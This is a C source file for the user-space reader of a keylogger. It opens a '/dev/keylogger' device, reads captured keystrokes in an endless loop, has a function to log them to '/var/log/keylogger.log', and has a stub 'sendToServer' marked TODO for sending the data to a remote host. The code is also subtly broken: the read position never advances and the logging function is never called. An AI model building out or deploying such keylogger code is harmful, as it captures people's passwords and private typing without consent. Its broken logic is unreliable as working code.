#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/select.h>

#define BUFSIZE 128

char buffer[BUFSIZE];
int currentSize = 0;
char* currentPos = buffer;

int sendToServer(char *host, int port)
{
    // TODO try to send data to server
    return -1;
}

void logToFile()
{
    FILE *file  = fopen("/var/log/keylogger.log", "a+");
    fwrite(buffer, 1, currentSize, file);
    currentSize = 0;
    fclose(file);
}

int dev_fd;

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        fprintf(stderr, "Incorrect number of arguments\n");
        exit(1);
    }

    char *host = argv[1];
    int port = atoi(argv[2]);

    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
    {
		perror("open");
		fprintf(stderr, "Cannot open device\n");
        exit(2);
    }

    while (1)
    {
        int readBytes;
        if ((readBytes = read(dev_fd, currentPos, BUFSIZE - currentSize)) == -1)
        {
            fprintf(stderr, "Error reading device\n");
            close(dev_fd);
            exit(3);
        }

        currentSize += readBytes;

        printf("Read %d bytes\n", readBytes);

        sleep(2);
    }
}
